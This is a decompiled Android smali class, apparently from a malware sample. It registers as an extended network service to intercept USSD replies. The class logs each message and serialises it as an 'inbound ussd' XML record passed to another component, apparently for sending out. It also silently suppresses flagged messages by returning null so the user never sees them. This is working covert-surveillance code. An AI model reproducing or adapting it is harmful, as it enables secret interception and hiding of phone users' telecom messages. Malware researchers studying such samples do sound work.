.class Lcom/network/ussd/CDUSSDService$2;
.super Lcom/android/internal/telephony/IExtendedNetworkService$Stub;


# instance fields
.field final synthetic a:Lcom/network/ussd/CDUSSDService;

.field private b:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/network/ussd/CDUSSDService;)V
    .locals 1

    iput-object p1, p0, Lcom/network/ussd/CDUSSDService$2;->a:Lcom/network/ussd/CDUSSDService;

    invoke-direct {p0}, Lcom/android/internal/telephony/IExtendedNetworkService$Stub;-><init>()V

    const-string v0, "Non"

    iput-object v0, p0, Lcom/network/ussd/CDUSSDService$2;->b:Ljava/lang/String;

    return-void
.end method

.method static synthetic a(Lcom/network/ussd/CDUSSDService$2;Ljava/lang/CharSequence;)V
    .locals 7

    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "CDUSSDService get user message: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v0

    new-instance v6, Ljava/io/StringWriter;

    invoke-direct {v6}, Ljava/io/StringWriter;-><init>()V

    iget-object v1, p0, Lcom/network/ussd/CDUSSDService$2;->a:Lcom/network/ussd/CDUSSDService;

    invoke-static {v0, v6}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    const-string v1, ""

    const-string v2, "sms"

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    invoke-virtual {v1}, Ljava/util/Date;->getTime()J

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v4

    const-string v1, "inbound"

    iget-object v2, p0, Lcom/network/ussd/CDUSSDService$2;->b:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v5, "ussd"

    invoke-static/range {v0 .. v5}, Lcom/network/android/m;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, ""

    const-string v2, "sms"

    invoke-interface {v0, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    invoke-static {v0}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;)V

    iget-object v0, p0, Lcom/network/ussd/CDUSSDService$2;->a:Lcom/network/ussd/CDUSSDService;

    invoke-virtual {v6}, Ljava/io/StringWriter;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x0

    invoke-static {v0, v1, v2, v3}, Lcom/network/android/j;->a(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/String;[[B)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "CDUSSDService exception: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method private a(Ljava/lang/CharSequence;)V
    .locals 2

    invoke-static {}, Lcom/network/ussd/CDUSSDService;->access$300()Landroid/os/Handler;

    move-result-object v0

    new-instance v1, Lcom/network/ussd/b;

    invoke-direct {v1, p0, p1}, Lcom/network/ussd/b;-><init>(Lcom/network/ussd/CDUSSDService$2;Ljava/lang/CharSequence;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method


# virtual methods
.method public clearMmiString()V
    .locals 1

    const-string v0, "CDUSSDService mBinder called clear!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    return-void
.end method

.method public getMmiRunningText()Ljava/lang/CharSequence;
    .locals 1

    const-string v0, "USSD code running"

    return-object v0
.end method

.method public getUserMessage(Ljava/lang/CharSequence;)Ljava/lang/CharSequence;
    .locals 3

    :try_start_0
    iget-object v0, p0, Lcom/network/ussd/CDUSSDService$2;->a:Lcom/network/ussd/CDUSSDService;

    invoke-static {v0, p1}, Lcom/network/ussd/CDUSSDService;->access$100(Lcom/network/ussd/CDUSSDService;Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "[BLOCKED]"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/network/ussd/CDUSSDService$2;->a(Ljava/lang/CharSequence;)V

    const/4 p1, 0x0

    :goto_0
    return-object p1

    :cond_0
    invoke-direct {p0, p1}, Lcom/network/ussd/CDUSSDService$2;->a(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "CDUSSDService getUserMessage exception: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public setMmiString(Ljava/lang/String;)V
    .locals 2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "CDUSSDService mBinder setMmiString:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iput-object p1, p0, Lcom/network/ussd/CDUSSDService$2;->b:Ljava/lang/String;

    return-void
.end method
